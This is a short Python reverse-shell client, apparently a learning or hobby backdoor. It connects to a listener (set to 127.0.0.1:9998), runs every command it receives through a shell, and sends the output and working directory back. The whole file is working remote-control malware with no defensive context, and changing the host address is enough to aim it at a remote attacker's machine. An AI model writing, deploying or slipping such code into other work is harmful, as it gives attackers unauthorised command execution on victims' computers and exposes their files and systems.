#!/usr/bin/
import socket
import os
import subprocess

s = socket.socket()
host = "127.0.0.1"
port = 9998
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        #this for use  display command in other computer
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        current = os.getcwd() + " > "
        s.send(str.encode(output_str + current))
        
        # this also same to don't print to client computer
        print(output_str)
    if data.decode("utf-8").strip() == "exit":
        break

